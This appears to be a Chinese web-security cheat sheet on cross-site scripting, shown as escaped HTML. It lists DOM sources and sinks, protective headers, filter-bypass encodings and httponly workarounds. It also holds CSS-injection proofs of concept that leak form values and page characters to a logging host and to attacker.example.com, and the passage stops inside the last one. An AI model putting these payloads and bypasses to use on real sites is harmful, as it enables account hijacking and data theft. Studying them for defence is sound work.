&lt;h1 id=&#34;xss数据源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss数据源&#34;&gt;#&lt;/a&gt; XSS 数据源&lt;/h1&gt;
&lt;h2 id=&#34;url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url&#34;&gt;#&lt;/a&gt; URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.pathname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.search&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.hash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.URL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.documentURI&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.baseURI&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;navigation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#navigation&#34;&gt;#&lt;/a&gt; Navigation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window.name&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.referrer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;communication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#communication&#34;&gt;#&lt;/a&gt; Communication&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ajax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Fetch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WebSocket&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PostMessage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;storage&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#storage&#34;&gt;#&lt;/a&gt; Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Cookie&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LocalStorage&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SessionStorage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sink&#34;&gt;#&lt;/a&gt; Sink&lt;/h1&gt;
&lt;h2 id=&#34;执行javascript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行javascript&#34;&gt;#&lt;/a&gt; 执行 JavaScript&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setTimeout(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setInterval(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Function(payload)()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;payload&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=x onerror=payload&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;加载url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加载url&#34;&gt;#&lt;/a&gt; 加载 URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.assign(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.replace(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;执行html&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行html&#34;&gt;#&lt;/a&gt; 执行 HTML&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xx.innerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xx.outerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.write(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.writeln(payload)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;xss保护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护&#34;&gt;#&lt;/a&gt; XSS 保护&lt;/h1&gt;
&lt;h2 id=&#34;html过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#html过滤&#34;&gt;#&lt;/a&gt; HTML 过滤&lt;/h2&gt;
&lt;p&gt;使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。&lt;/p&gt;
&lt;h2 id=&#34;x-frame&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x-frame&#34;&gt;#&lt;/a&gt; X-Frame&lt;/h2&gt;
&lt;p&gt;X-Frame-Options 响应头有三个可选的值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DENY
&lt;ul&gt;
&lt;li&gt;页面不能被嵌入到任何 iframe 或 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SAMEORIGIN
&lt;ul&gt;
&lt;li&gt;页面只能被本站页面嵌入到 iframe 或者 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ALLOW-FROM
&lt;ul&gt;
&lt;li&gt;页面允许 frame 或 frame 加载&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xss保护头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护头&#34;&gt;#&lt;/a&gt; XSS 保护头&lt;/h2&gt;
&lt;p&gt;基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。&lt;/p&gt;
&lt;p&gt;而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。&lt;/p&gt;
&lt;p&gt;要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段 该字段有三个可选的值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  : 表示关闭浏览器的 XSS 防护机制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt;  : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为 X-XSS-Protection 配置为 1，这是浏览器的默认设置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1; mode=block&lt;/code&gt;  : 如果检测到恶意代码，在不渲染恶意代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。&lt;/p&gt;
&lt;h1 id=&#34;waf-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-bypass&#34;&gt;#&lt;/a&gt; WAF Bypass&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;利用 &amp;lt;&amp;gt; 标记&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 html 属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;href&lt;/li&gt;
&lt;li&gt;lowsrc&lt;/li&gt;
&lt;li&gt;bgsound&lt;/li&gt;
&lt;li&gt;background&lt;/li&gt;
&lt;li&gt;value&lt;/li&gt;
&lt;li&gt;action&lt;/li&gt;
&lt;li&gt;dynsrc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关键字&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用回车拆分&lt;/li&gt;
&lt;li&gt;字符串拼接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;al&amp;quot; + &amp;quot;ert&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用编码绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;base64&lt;/li&gt;
&lt;li&gt;jsfuck&lt;/li&gt;
&lt;li&gt;String.fromCharCode&lt;/li&gt;
&lt;li&gt;HTML&lt;/li&gt;
&lt;li&gt;URL&lt;/li&gt;
&lt;li&gt;hex
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;\x61\x6c\x65\x72\x74&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;unicode&lt;/li&gt;
&lt;li&gt;utf7
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;+ADw-script+AD4-alert(&#39;XSS&#39;)+ADsAPA-/script+AD4-&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;utf16&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大小写混淆&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;产生事件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;css 跨站解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;长度限制 bypass&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(name)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eval(hash)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;import&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.getScript&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.get&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用  &lt;code&gt;。&lt;/code&gt;  绕过 IP / 域名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document[&#39;cookie&#39;]&lt;/code&gt;  绕过属性取值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤引号用  &lt;code&gt;`&lt;/code&gt;  绕过&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#技巧&#34;&gt;#&lt;/a&gt; 技巧&lt;/h1&gt;
&lt;h2 id=&#34;httponly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#httponly&#34;&gt;#&lt;/a&gt; httponly&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。&lt;/li&gt;
&lt;li&gt;在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie&lt;/li&gt;
&lt;li&gt;部分特定版本的浏览器可能会在 httponly 支持 / 处理上存在问题&lt;/li&gt;
&lt;li&gt;低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段&lt;/li&gt;
&lt;li&gt;phpinfo 等页面可能会回显信息，这些信息中包含 http 头&lt;/li&gt;
&lt;li&gt;通过 xss 劫持页面钓鱼&lt;/li&gt;
&lt;li&gt;通过 xss 伪造 oauth 等授权请求，远程登录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css注入&#34;&gt;#&lt;/a&gt; CSS 注入&lt;/h2&gt;
&lt;h3 id=&#34;基本介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本介绍&#34;&gt;#&lt;/a&gt; 基本介绍&lt;/h3&gt;
&lt;p&gt;CSS 注入最早开始于利用 CSS 中的  &lt;code&gt;expression()&lt;/code&gt;   &lt;code&gt;url()&lt;/code&gt;   &lt;code&gt;regex()&lt;/code&gt;  等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。&lt;/p&gt;
&lt;h3 id=&#34;css-selectors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-selectors&#34;&gt;#&lt;/a&gt; CSS selectors&lt;/h3&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;a&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;b&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;c&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    [...]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://example.com&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;form2&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;abc&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上图是利用 CSS selectors 完成攻击的一个示例&lt;/p&gt;
&lt;h3 id=&#34;abusing-unicode-range&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#abusing-unicode-range&#34;&gt;#&lt;/a&gt; Abusing Unicode Range&lt;/h3&gt;
&lt;p&gt;当可以插入 CSS 的时候，可以使用  &lt;code&gt;font-face&lt;/code&gt;  配合  &lt;code&gt;unicode-range&lt;/code&gt;  获取目标网页对应字符集。PoC 如下&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0041&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?B&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched too */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0042&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?C&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* not fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0043&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token selector&#34;&gt;#sensitive-information&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token 